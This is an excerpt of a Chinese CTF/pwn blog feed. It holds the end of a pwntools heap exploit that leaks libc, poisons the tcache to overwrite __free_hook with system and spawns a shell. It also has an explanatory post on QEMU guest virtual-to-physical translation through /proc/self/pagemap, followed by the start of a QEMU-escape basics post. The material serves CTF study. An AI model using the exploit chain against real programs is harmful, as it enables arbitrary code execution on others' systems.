<span id="cb10-46"><a href="#cb10-46" aria-hidden="true"></a>delete(<span class="dv">0</span>)</span>
<span id="cb10-47"><a href="#cb10-47" aria-hidden="true"></a>show(<span class="dv">0</span>)</span>
<span id="cb10-48"><a href="#cb10-48" aria-hidden="true"></a>p.recvuntil(<span class="st">&quot;Data:</span><span class="ch">\n</span><span class="st">&quot;</span>)</span>
<span id="cb10-49"><a href="#cb10-49" aria-hidden="true"></a>libc.address <span class="op">=</span> u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">-</span>libc.sym[<span class="st">&#39;__malloc_hook&#39;</span>]<span class="op">-</span><span class="bn">0x10</span><span class="op">-</span><span class="dv">96</span></span>
<span id="cb10-50"><a href="#cb10-50" aria-hidden="true"></a><span class="bu">print</span> <span class="bu">hex</span>(libc.address)</span>
<span id="cb10-51"><a href="#cb10-51" aria-hidden="true"></a>add(<span class="bn">0x438</span>)<span class="co">#4</span></span>
<span id="cb10-52"><a href="#cb10-52" aria-hidden="true"></a>delete(<span class="dv">2</span>)</span>
<span id="cb10-53"><a href="#cb10-53" aria-hidden="true"></a>mp_tcache_bins <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x1e02d0</span> <span class="co"># mp_.tcache_bins</span></span>
<span id="cb10-54"><a href="#cb10-54" aria-hidden="true"></a>edit(<span class="dv">0</span>,p64(<span class="dv">0</span>)<span class="op">*</span><span class="dv">3</span><span class="op">+</span>p64(mp_tcache_bins<span class="op">-</span><span class="bn">0x20</span>))</span>
<span id="cb10-55"><a href="#cb10-55" aria-hidden="true"></a>add(<span class="bn">0x438</span>)<span class="co">#5</span></span>
<span id="cb10-56"><a href="#cb10-56" aria-hidden="true"></a></span>
<span id="cb10-57"><a href="#cb10-57" aria-hidden="true"></a>delete(<span class="dv">1</span>)</span>
<span id="cb10-58"><a href="#cb10-58" aria-hidden="true"></a>show(<span class="dv">1</span>)</span>
<span id="cb10-59"><a href="#cb10-59" aria-hidden="true"></a>p.recvuntil(<span class="st">&quot;Data:</span><span class="ch">\n</span><span class="st">&quot;</span>)</span>
<span id="cb10-60"><a href="#cb10-60" aria-hidden="true"></a>key <span class="op">=</span> u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))</span>
<span id="cb10-61"><a href="#cb10-61" aria-hidden="true"></a><span class="bu">print</span> <span class="bu">hex</span>(key)</span>
<span id="cb10-62"><a href="#cb10-62" aria-hidden="true"></a>delete(<span class="dv">3</span>)</span>
<span id="cb10-63"><a href="#cb10-63" aria-hidden="true"></a>edit(<span class="dv">3</span>,p64(libc.sym[<span class="st">&#39;__free_hook&#39;</span>]<span class="op">^</span>key))</span>
<span id="cb10-64"><a href="#cb10-64" aria-hidden="true"></a>add(<span class="bn">0x408</span>,<span class="st">&quot;/bin/sh</span><span class="ch">\x00</span><span class="st">&quot;</span>)<span class="co">#6</span></span>
<span id="cb10-65"><a href="#cb10-65" aria-hidden="true"></a>add(<span class="bn">0x408</span>,p64(libc.sym[<span class="st">&#39;system&#39;</span>]))<span class="co">#7</span></span>
<span id="cb10-66"><a href="#cb10-66" aria-hidden="true"></a>delete(<span class="dv">6</span>)</span>
<span id="cb10-67"><a href="#cb10-67" aria-hidden="true"></a></span>
<span id="cb10-68"><a href="#cb10-68" aria-hidden="true"></a><span class="co"># debug(p)</span></span>
<span id="cb10-69"><a href="#cb10-69" aria-hidden="true"></a>p.interactive()</span></code></pre></div>
<blockquote>
<p>对于ORW 同样参考0x01</p>
</blockquote>]]></description>
    <pubDate>Wed, 23 Nov 2022 15:32:04 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[虚拟地址到物理地址]]></title>
    <link>https://blog.mark0519.com/#/pwnable/221108-gva2gpa</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#/pwnable/221108-gva2gpa</guid>
    <description><![CDATA[<h1 id="虚拟地址到物理地址">虚拟地址到物理地址</h1>
<h1 id="x00-开始之前">0x00 开始之前</h1>
<p>先前看一个<a href="https://blog.mark0519.com/#/pwnable/221025-qemu-basic?id=_0x02-hws2021-fastcp">qemu逃逸题</a>遇到:</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a>cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src + <span class="dv">8</span> * v9, &amp;cp_info, <span class="bn">0x18</span><span class="bu">uLL</span>, <span class="dv">0</span>);</span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a>cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="dv">0</span>);</span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true"></a>cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="dv">1</span>);</span></code></pre></div>
<p>主要是第一次遇到这个函数：<strong>cpu_physical_memory_rw()</strong></p>
<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a><span class="dt">void</span> cpu_physical_memory_rw(hwaddr addr, <span class="dt">void</span> *buf,</span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true"></a>                            hwaddr len, <span class="dt">bool</span> is_write);</span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true"></a><span class="dt">static</span> <span class="kw">inline</span> <span class="dt">void</span> cpu_physical_memory_read(hwaddr addr,</span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true"></a>                                            <span class="dt">void</span> *buf, hwaddr len)</span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true"></a>{</span>
<span id="cb2-6"><a href="#cb2-6" aria-hidden="true"></a>    cpu_physical_memory_rw(addr, buf, len, false);</span>
<span id="cb2-7"><a href="#cb2-7" aria-hidden="true"></a>}</span>
<span id="cb2-8"><a href="#cb2-8" aria-hidden="true"></a><span class="dt">static</span> <span class="kw">inline</span> <span class="dt">void</span> cpu_physical_memory_write(hwaddr addr,</span>
<span id="cb2-9"><a href="#cb2-9" aria-hidden="true"></a>                                             <span class="dt">const</span> <span class="dt">void</span> *buf, hwaddr len)</span>
<span id="cb2-10"><a href="#cb2-10" aria-hidden="true"></a>{</span>
<span id="cb2-11"><a href="#cb2-11" aria-hidden="true"></a>    cpu_physical_memory_rw(addr, (<span class="dt">void</span> *)buf, len, true);</span>
<span id="cb2-12"><a href="#cb2-12" aria-hidden="true"></a>}</span></code></pre></div>
<p>也就是说:</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a> cpu_physical_memory_rw(hwaddr addr,<span class="dt">void</span> *buf, hwaddr len,``false``)</span></code></pre></div>
<p>把物理地址hwaddr addr上的内容复制到虚拟地址void *buf上</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a> cpu_physical_memory_rw(hwaddr addr,<span class="dt">void</span> *buf, hwaddr len,``true``)</span></code></pre></div>
<p>把虚拟地址void *buf的内容复制到物理地址hwaddr addr上</p>
<p>这就牵扯到了我们需要根据虚拟地址计算物理地址的问题</p>
<h1 id="x01-qemu内存概述">0x01 qemu内存概述</h1>
<h2 id="qemu-内存布局">1. qemu 内存布局</h2>
<p>运行的每个qemu虚拟机都相应的是一个qemu进程，从本质上看，虚拟出的每个虚拟机对应 host 上的一个 qemu 进程，而虚拟机的执行线程（如 CPU 线程、I/O 线程等）对应 qemu 进程的一个线程。</p>
<figure>
<img src="https://jjuku29a1d.feishu.cn/space/api/box/stream/download/asynccode/?code=ODNjYjQ4ZDY5NDcxNGU2ZDNhNjdiMWFjZjNmZGRjYTVfZ3paa1pBc09aWFcwT0xpME5ITkVHOVVrOUowelcyOExfVG9rZW46Ym94Y25KUzF3eGQ0Yk53TGNxV2F6aFNIcDRkXzE2Njc5MTY2MTk6MTY2NzkyMDIxOV9WNA" alt="" /><figcaption>img</figcaption>
</figure>
<p>也就是说，对于qemu来说，地址映射具体为：</p>
<p>GVA(虚拟机虚拟地址) -&gt; GPA(虚拟机物理地址) -&gt; HVA(宿主机虚拟地址) -&gt; HPA(宿主机物理地址)</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true"></a>                        Guest&#39; processes</span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true"></a>                     +--------------------+</span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true"></a>Virtual addr space   |                    |</span>
<span id="cb5-4"><a href="#cb5-4" aria-hidden="true"></a>                     +--------------------+</span>
<span id="cb5-5"><a href="#cb5-5" aria-hidden="true"></a>                     |                    |</span>
<span id="cb5-6"><a href="#cb5-6" aria-hidden="true"></a>                     \__   Page Table     \__</span>
<span id="cb5-7"><a href="#cb5-7" aria-hidden="true"></a>                        \                    \</span>
<span id="cb5-8"><a href="#cb5-8" aria-hidden="true"></a>                         |                    |  Guest kernel</span>
<span id="cb5-9"><a href="#cb5-9" aria-hidden="true"></a>                    +----+--------------------+----------------+</span>
<span id="cb5-10"><a href="#cb5-10" aria-hidden="true"></a>Guest&#39;s phy. memory |    |                    |                |</span>
<span id="cb5-11"><a href="#cb5-11" aria-hidden="true"></a>                    +----+--------------------+----------------+</span>
<span id="cb5-12"><a href="#cb5-12" aria-hidden="true"></a>                    |                                          |</span>
<span id="cb5-13"><a href="#cb5-13" aria-hidden="true"></a>                    \__                                        \__</span>
<span id="cb5-14"><a href="#cb5-14" aria-hidden="true"></a>                       \                                          \</span>
<span id="cb5-15"><a href="#cb5-15" aria-hidden="true"></a>                        |             QEMU process                 |</span>
<span id="cb5-16"><a href="#cb5-16" aria-hidden="true"></a>                   +----+------------------------------------------+</span>
<span id="cb5-17"><a href="#cb5-17" aria-hidden="true"></a>Virtual addr space |    |                                          |</span>
<span id="cb5-18"><a href="#cb5-18" aria-hidden="true"></a>                   +----+------------------------------------------+</span>
<span id="cb5-19"><a href="#cb5-19" aria-hidden="true"></a>                   |                                               |</span>
<span id="cb5-20"><a href="#cb5-20" aria-hidden="true"></a>                    \__                Page Table                   \__</span>
<span id="cb5-21"><a href="#cb5-21" aria-hidden="true"></a>                       \                                               \</span>
<span id="cb5-22"><a href="#cb5-22" aria-hidden="true"></a>                        |                                               |</span>
<span id="cb5-23"><a href="#cb5-23" aria-hidden="true"></a>                   +----+-----------------------------------------------++</span>
<span id="cb5-24"><a href="#cb5-24" aria-hidden="true"></a>Physical memory    |    |                                               ||</span>
<span id="cb5-25"><a href="#cb5-25" aria-hidden="true"></a>                   +----+-----------------------------------------------++</span></code></pre></div>
<p>需要注意的是，虽然上图看起来虚拟地址到物理地址的映射是连续的，但实际上并不是。</p>
<p>对于QEMU来说，一个内存页的大小是0x1000，如果我们使用mmap申请一个0x2000大小的空间，那么他们的虚拟地址确实是连续的，但是物理地址页并不一定连续。</p>
<ol type="1">
<li><h2 id="申请连续物理内存的两种方式">申请连续物理内存的两种方式</h2></li>
<li><h3 id="爆破">爆破</h3></li>
</ol>
<blockquote>
<p>多次申请直到物理内存连续</p>
</blockquote>
<p>字面意思，多次mmap 0x1000大小的内存，并根据虚拟地址计算物理地址，一直到出现两个连续的物理内存页。</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a><span class="dt">size_t</span> buf0, buf1;</span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true"></a></span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true"></a><span class="dt">void</span> get_pages()</span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true"></a>{</span>
<span id="cb6-5"><a href="#cb6-5" aria-hidden="true"></a>    <span class="dt">size_t</span> buf[<span class="bn">0x1000</span>];</span>
<span id="cb6-6"><a href="#cb6-6" aria-hidden="true"></a>    <span class="dt">size_t</span> arry[<span class="bn">0x1000</span>];</span>
<span id="cb6-7"><a href="#cb6-7" aria-hidden="true"></a>    <span class="dt">size_t</span> arr = mmap(NULL, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, <span class="dv">0</span>, <span class="dv">0</span>);</span>
<span id="cb6-8"><a href="#cb6-8" aria-hidden="true"></a>    *(<span class="dt">char</span> *)arr = <span class="ch">&#39;a&#39;</span>;</span>
<span id="cb6-9"><a href="#cb6-9" aria-hidden="true"></a>    <span class="dt">int</span> n = <span class="dv">0</span>;</span>
<span id="cb6-10"><a href="#cb6-10" aria-hidden="true"></a>    buf[n] = gva_to_gfn(arr);</span>
<span id="cb6-11"><a href="#cb6-11" aria-hidden="true"></a>    arry[n++] = arr;</span>
<span id="cb6-12"><a href="#cb6-12" aria-hidden="true"></a>    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">1</span>; i &lt; <span class="bn">0x1000</span>; i++)</span>
<span id="cb6-13"><a href="#cb6-13" aria-hidden="true"></a>    {</span>
<span id="cb6-14"><a href="#cb6-14" aria-hidden="true"></a>        arr = mmap(NULL, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, <span class="dv">0</span>, <span class="dv">0</span>);</span>
<span id="cb6-15"><a href="#cb6-15" aria-hidden="true"></a>        *(<span class="dt">char</span> *)arr = <span class="ch">&#39;a&#39;</span>;</span>
<span id="cb6-16"><a href="#cb6-16" aria-hidden="true"></a>        <span class="dt">size_t</span> fn = gva_to_gfn(arr);</span>
<span id="cb6-17"><a href="#cb6-17" aria-hidden="true"></a>        <span class="cf">for</span> (<span class="dt">int</span> j = <span class="dv">0</span>; j &lt; n; j++)</span>
<span id="cb6-18"><a href="#cb6-18" aria-hidden="true"></a>        {</span>
<span id="cb6-19"><a href="#cb6-19" aria-hidden="true"></a>            <span class="cf">if</span> (buf[j] == fn + <span class="dv">1</span> || buf[j] + <span class="dv">1</span> == fn)</span>
<span id="cb6-20"><a href="#cb6-20" aria-hidden="true"></a>            {</span>
<span id="cb6-21"><a href="#cb6-21" aria-hidden="true"></a>                LOG(<span class="st">&quot;consist pages&quot;</span>);</span>
<span id="cb6-22"><a href="#cb6-22" aria-hidden="true"></a>                <span class="cf">if</span> (fn &gt; buf[j])</span>
<span id="cb6-23"><a href="#cb6-23" aria-hidden="true"></a>                {</span>
<span id="cb6-24"><a href="#cb6-24" aria-hidden="true"></a>                    buf0 = arry[j];</span>
<span id="cb6-25"><a href="#cb6-25" aria-hidden="true"></a>                    buf1 = arr;</span>
<span id="cb6-26"><a href="#cb6-26" aria-hidden="true"></a>                    phy_buf0 = (buf[j]&lt;&lt;<span class="dv">12</span>);</span>
<span id="cb6-27"><a href="#cb6-27" aria-hidden="true"></a>                }</span>
<span id="cb6-28"><a href="#cb6-28" aria-hidden="true"></a>                <span class="cf">else</span></span>
<span id="cb6-29"><a href="#cb6-29" aria-hidden="true"></a>                {</span>
<span id="cb6-30"><a href="#cb6-30" aria-hidden="true"></a>                    buf1 = arry[j];</span>
<span id="cb6-31"><a href="#cb6-31" aria-hidden="true"></a>                    buf0 = arr;</span>
<span id="cb6-32"><a href="#cb6-32" aria-hidden="true"></a>                    phy_buf0 = (fn&lt;&lt;<span class="dv">12</span>);</span>
<span id="cb6-33"><a href="#cb6-33" aria-hidden="true"></a>                }</span>
<span id="cb6-34"><a href="#cb6-34" aria-hidden="true"></a>                <span class="cf">return</span>;</span>
<span id="cb6-35"><a href="#cb6-35" aria-hidden="true"></a>            }</span>
<span id="cb6-36"><a href="#cb6-36" aria-hidden="true"></a>        }</span>
<span id="cb6-37"><a href="#cb6-37" aria-hidden="true"></a>        buf[n] = fn;</span>
<span id="cb6-38"><a href="#cb6-38" aria-hidden="true"></a>        arry[n++] = arr;</span>
<span id="cb6-39"><a href="#cb6-39" aria-hidden="true"></a>    }</span>
<span id="cb6-40"><a href="#cb6-40" aria-hidden="true"></a>}</span></code></pre></div>
<h2 id="申请linux大页">2. 申请linux大页</h2>
<blockquote>
<p>主动申请连续物理地址</p>
</blockquote>
<p><a href="https://cloud.tencent.com/developer/article/1055041">Linux申请大页内存(mmap)</a></p>
<p>操作系统对内存采用多级页表和分页进行管理，操作系统每个页默认大小为4KB（0x1000）。</p>
<p>如果进程使用的内存过大，比如1GB，这样会在页表中占用 1GB / 4KB = 262144个页表项，而系统TLB可以容纳的页表项远小于这个数量。当多个内存密集型应用访问内存时，会造成过多的TLB未命中，因此在特定情况下会需要减少未命中次数，一个可行的办法就是增大每个页的尺寸。</p>
<p>操作系统默认支持的大页是2MB（512 * 0x1000 ），当使用1GB内存时，在页表中将占用 1GB / 2MB = 512个页表项，可以大大提升TLB命中率，进而提升应用性能。</p>
<blockquote>
<p>申请后还需访存一下，这里使用了memset，确保物理页被真实映射。</p>
</blockquote>
<div class="sourceCode" id="cb7"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a>system(<span class="st">&quot;sysctl vm.nr_hugepages=30&quot;</span>); <span class="co">// 开启大页</span></span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true"></a><span class="dt">void</span> * buf = mmap(<span class="dv">0</span>, <span class="dv">512</span> * <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE , MAP_SHARED | MAP_ANONYMOUS | <span class="bn">0x40000</span>, -<span class="dv">1</span>, <span class="dv">0</span>);</span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true"></a>memset(buf,<span class="ch">&#39;a&#39;</span>,<span class="bn">0x2000</span>);</span></code></pre></div>
<h1 id="x02-gva2gpa">0x02 GVA2GPA</h1>
<h2 id="原理">1. 原理</h2>
<p>将虚拟地址转换为物理地址需要访问页表，然而只有内核态的程序才能访问到页表，用户态程序无权访问。此外，Linux 系统提供了一种用户态程序访问页表的方式，通过查看 <code>/proc/pid/pagemap</code> 文件可得到虚拟内存页映射与物理内存页的映射关系。显然后者更为简单，所以下面使用该方法实现地址转换。</p>
<p>根据内核文档可知，每个虚拟页在 <code>/proc/pid/pagemap</code> 中对应一项长度为 64 bits 的数据，其中 Bit 63 为 page present，表示物理内存页是否已存在；若物理页已存在，则 Bits 0-54 表示物理页号。此外，需要 root 权限的进程才能读取 <code>/proc/pid/pagemap</code> 中的内容。</p>
<blockquote>
<p>pagemap is a new (as of 2.6.25) set of interfaces in the kernel that allow userspace programs to examine the page tables and related information by reading files in /proc.</p>
<p>There are four components to pagemap:</p>
<p>*/proc/pid/pagemap. This file lets a userspace process find out which physical frame each virtual page is mapped to. It contains one 64-bit value for each virtual page, containing the following data (from fs/proc/task_mmu.c, above pagemap_read):</p>
<p>* Bits 0-54 page frame number (PFN) if present</p>
<p>* Bits 0-4 swap type if swapped</p>
<p>* Bits 5-54 swap offset if swapped</p>
<p>* Bit 55 pte is soft-dirty (see Documentation/vm/soft-dirty.txt)</p>
<p>* Bit 56 page exclusively mapped (since 4.2)</p>
<p>* Bits 57-60 zero</p>
<p>* Bit 61 page is file-page or shared-anon (since 3.5)</p>
<p>* Bit 62 page swapped</p>
<p>* Bit 63 page present</p>
<p>Since Linux 4.0 only users with the CAP_SYS_ADMIN capability can get PFNs. In 4.0 and 4.1 opens by unprivileged fail with -EPERM. Starting from 4.2 the PFN field is zeroed if the user does not have CAP_SYS_ADMIN. Reason: information about PFNs helps in exploiting Rowhammer vulnerability.</p>
</blockquote>
<p>根据以上信息，利用 <code>/proc/pid/pagemap</code> 可将虚拟地址转换为物理地址，具体步骤如下：</p>
<p>1）计算虚拟地址所在虚拟页对应的数据项在 <code>/proc/pid/pagmap</code> 中的偏移；</p>
<pre><code>offset = (viraddr / pagesize) * sizeof(uint64_t)</code></pre>
<p>2）读取长度为 64 bits 的数据项；</p>
<p>3）根据 Bit 63 判断物理内存页是否存在；</p>
<p>4）若物理内存页已存在，则取 bits 0 - 54 作为物理页号；</p>
<p>5）计算出物理页起始地址加上页内偏移即得到物理地址；</p>
<pre><code>phyaddr = pageframenum * pagesize + viraddr % pagesize;</code></pre>
<h2 id="实现">2.实现</h2>
<p>具体实现代码如下：</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span><span class="pp">      </span></span>
<span id="cb10-2"><a href="#cb10-2" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;stdint.h&gt;</span></span>
<span id="cb10-3"><a href="#cb10-3" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
<span id="cb10-4"><a href="#cb10-4" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></span>
<span id="cb10-5"><a href="#cb10-5" aria-hidden="true"></a><span class="dt">size_t</span> va2pa(<span class="dt">void</span> *addr){</span>
<span id="cb10-6"><a href="#cb10-6" aria-hidden="true"></a>    <span class="dt">uint64_t</span> data;</span>
<span id="cb10-7"><a href="#cb10-7" aria-hidden="true"></a></span>
<span id="cb10-8"><a href="#cb10-8" aria-hidden="true"></a>    <span class="dt">int</span> fd = open(<span class="st">&quot;/proc/self/pagemap&quot;</span>,O_RDONLY);</span>
<span id="cb10-9"><a href="#cb10-9" aria-hidden="true"></a>    <span class="cf">if</span>(!fd){</span>
<span id="cb10-10"><a href="#cb10-10" aria-hidden="true"></a>        perror(<span class="st">&quot;open pagemap&quot;</span>);</span>
<span id="cb10-11"><a href="#cb10-11" aria-hidden="true"></a>        <span class="cf">return</span> <span class="dv">0</span>;</span>
<span id="cb10-12"><a href="#cb10-12" aria-hidden="true"></a>    }</span>
<span id="cb10-13"><a href="#cb10-13" aria-hidden="true"></a></span>
<span id="cb10-14"><a href="#cb10-14" aria-hidden="true"></a>    <span class="dt">size_t</span> pagesize = getpagesize();</span>
<span id="cb10-15"><a href="#cb10-15" aria-hidden="true"></a>    <span class="dt">size_t</span> offset = ((<span class="dt">uintptr_t</span>)addr / pagesize) * <span class="kw">sizeof</span>(<span class="dt">uint64_t</span>);</span>
<span id="cb10-16"><a href="#cb10-16" aria-hidden="true"></a></span>
<span id="cb10-17"><a href="#cb10-17" aria-hidden="true"></a>    <span class="cf">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="dv">0</span>){</span>
<span id="cb10-18"><a href="#cb10-18" aria-hidden="true"></a>        puts(<span class="st">&quot;lseek&quot;</span>);</span>
<span id="cb10-19"><a href="#cb10-19" aria-hidden="true"></a>        close(fd);</span>
<span id="cb10-20"><a href="#cb10-20" aria-hidden="true"></a>        <span class="cf">return</span> <span class="dv">0</span>;</span>
<span id="cb10-21"><a href="#cb10-21" aria-hidden="true"></a>    }</span>
<span id="cb10-22"><a href="#cb10-22" aria-hidden="true"></a></span>
<span id="cb10-23"><a href="#cb10-23" aria-hidden="true"></a>    <span class="cf">if</span>(read(fd,&amp;data,<span class="dv">8</span>) != <span class="dv">8</span>){</span>
<span id="cb10-24"><a href="#cb10-24" aria-hidden="true"></a>        puts(<span class="st">&quot;read&quot;</span>);</span>
<span id="cb10-25"><a href="#cb10-25" aria-hidden="true"></a>        close(fd);</span>
<span id="cb10-26"><a href="#cb10-26" aria-hidden="true"></a>        <span class="cf">return</span> <span class="dv">0</span>;</span>
<span id="cb10-27"><a href="#cb10-27" aria-hidden="true"></a>    }</span>
<span id="cb10-28"><a href="#cb10-28" aria-hidden="true"></a></span>
<span id="cb10-29"><a href="#cb10-29" aria-hidden="true"></a>    <span class="cf">if</span>(!(data &amp; (((<span class="dt">uint64_t</span>)<span class="dv">1</span> &lt;&lt; <span class="dv">63</span>)))){</span>
<span id="cb10-30"><a href="#cb10-30" aria-hidden="true"></a>        puts(<span class="st">&quot;page&quot;</span>);</span>
<span id="cb10-31"><a href="#cb10-31" aria-hidden="true"></a>        close(fd);</span>
<span id="cb10-32"><a href="#cb10-32" aria-hidden="true"></a>        <span class="cf">return</span> <span class="dv">0</span>;</span>
<span id="cb10-33"><a href="#cb10-33" aria-hidden="true"></a>    }</span>
<span id="cb10-34"><a href="#cb10-34" aria-hidden="true"></a></span>
<span id="cb10-35"><a href="#cb10-35" aria-hidden="true"></a>    <span class="dt">size_t</span> pageframenum = data &amp; ((<span class="dv">1</span><span class="bu">ull</span> &lt;&lt; <span class="dv">55</span>) - <span class="dv">1</span>);</span>
<span id="cb10-36"><a href="#cb10-36" aria-hidden="true"></a>    <span class="dt">size_t</span> phyaddr = pageframenum * pagesize + (<span class="dt">uintptr_t</span>)addr % pagesize;</span>
<span id="cb10-37"><a href="#cb10-37" aria-hidden="true"></a></span>
<span id="cb10-38"><a href="#cb10-38" aria-hidden="true"></a>    close(fd);</span>
<span id="cb10-39"><a href="#cb10-39" aria-hidden="true"></a></span>
<span id="cb10-40"><a href="#cb10-40" aria-hidden="true"></a>    <span class="cf">return</span> phyaddr;</span>
<span id="cb10-41"><a href="#cb10-41" aria-hidden="true"></a>}</span>
<span id="cb10-42"><a href="#cb10-42" aria-hidden="true"></a><span class="dt">int</span> main()</span>
<span id="cb10-43"><a href="#cb10-43" aria-hidden="true"></a>{</span>
<span id="cb10-44"><a href="#cb10-44" aria-hidden="true"></a>    <span class="dt">size_t</span> phyaddr;</span>
<span id="cb10-45"><a href="#cb10-45" aria-hidden="true"></a>    <span class="dt">size_t</span> viraddr;</span>
<span id="cb10-46"><a href="#cb10-46" aria-hidden="true"></a>    <span class="dt">uint32_t</span> pid;</span>
<span id="cb10-47"><a href="#cb10-47" aria-hidden="true"></a>    printf(<span class="st">&quot;pid = &quot;</span>);</span>
<span id="cb10-48"><a href="#cb10-48" aria-hidden="true"></a>    scanf(<span class="st">&quot;%u&quot;</span>, &amp;pid);</span>
<span id="cb10-49"><a href="#cb10-49" aria-hidden="true"></a>    printf(<span class="st">&quot;virtual address = &quot;</span>);</span>
<span id="cb10-50"><a href="#cb10-50" aria-hidden="true"></a>    scanf(<span class="st">&quot;%x&quot;</span>, &amp;viraddr);</span>
<span id="cb10-51"><a href="#cb10-51" aria-hidden="true"></a>    phyaddr = virtual_to_physical(pid, viraddr);</span>
<span id="cb10-52"><a href="#cb10-52" aria-hidden="true"></a>    printf(<span class="st">&quot;virtual address = %p,physical address = %p</span><span class="sc">\n</span><span class="st">&quot;</span>, viraddr, phyaddr);</span>
<span id="cb10-53"><a href="#cb10-53" aria-hidden="true"></a>    <span class="cf">return</span> <span class="dv">0</span>;</span>
<span id="cb10-54"><a href="#cb10-54" aria-hidden="true"></a>}</span></code></pre></div>
<h1 id="x03-参考连接">0x03 参考连接</h1>
<p>https://blog.mark0519.com/#/pwnable/221025-qemu-basic</p>
<p>http://0x4c43.cn/2018/0508/linux-dynamic-link/</p>
<p>https://juniorprincewang.github.io/2018/07/20/qemu-memory/</p>
<p>https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#qemu%E6%A6%82%E8%BF%B0</p>
<p>https://www.anquanke.com/post/id/256977#h3-3</p>
<p>http://a1ex.online/2021/10/13/%E4%BB%8Eqemu%E9%80%83%E9%80%B8%E5%88%B0%E9%80%83%E8%B7%91/</p>]]></description>
    <pubDate>Sun, 13 Nov 2022 21:52:48 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[一、QEMU逃逸  --  basic ]]></title>
    <link>https://blog.mark0519.com/#/pwnable/221025-qemu-basic</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#/pwnable/221025-qemu-basic</guid>
    <description><![CDATA[<h1 id="一qemu逃逸-basic">一、QEMU逃逸 – basic</h1>
<blockquote>
<p><del>玩不懂kernel的菜鸡来霍霍qemu辣</del></p>
</blockquote>
<h2 id="x00-lspci">0x00 lspci</h2>
<p>pci外设地址，形如<code>0000:00:1f.1</code>。第一个部分16位表示域；第二个部分8位表示总线编号；第三个部分5位表示设备号；最后一个部分3位表示功能号。下面是<code>lspci</code>的输出，其中<code>pci</code>设备的地址，在最头部给出，由于<code>pc</code>设备总只有一个0号域，所以会省略域。</p>
<figure>
<img src="https://p4.ssl.qhimg.com/t01e511a0ccabc44633.png" alt="" /><figcaption>image</figcaption>
</figure>
<p><code>lspci -v -t</code>会用树状图的形式输出pci设备，会显得更加直观</p>
<figure>
<img src="https://p2.ssl.qhimg.com/t0106de490068b32c99.png" alt="" /><figcaption>image</figcaption>
</figure>
<p><code>lspci -v</code>就能输出设备的详细信息</p>
<figure>
<img src="https://p0.ssl.qhimg.com/t01a78f0178e71b000f.png" alt="" /><figcaption>image</figcaption>
</figure>
<p>仔细观察相关的输出，可以从中知道<code>mmio</code>的地址是<code>0xfebf1000</code>，<code>pmio</code>的端口是<code>0xc050</code>。</p>
<figure>
<img src="https://p1.ssl.qhimg.com/t0129b36299082dc698.png" alt="" /><figcaption>image</figcaption>
</figure>
<p>在<code>/sys/bus/pci/devices</code>可以找到每个总线设备相关的一写文件。</p>
<figure>
<img src="https://p3.ssl.qhimg.com/t01ddba05509f456110.png" alt="" /><figcaption>image</figcaption>
</figure>
<figure>
<img src="https://p0.ssl.qhimg.com/t016c20a809c748def6.png" alt="" /><figcaption>image</figcaption>
</figure>
<p>每个设备的目录下<code>resource0</code> 对应<code>MMIO</code>空间。<code>resource1</code> 对应<code>PMIO</code>空间。 <code>resource</code>文件里面会记录相关的数据，第一行就是<code>mimo</code>的信息，从左到右是：起始地址、结束地址、标识位。</p>
<h2 id="x01-antctf-2021-d3dev">0x01 AntCTF 2021 d3dev</h2>
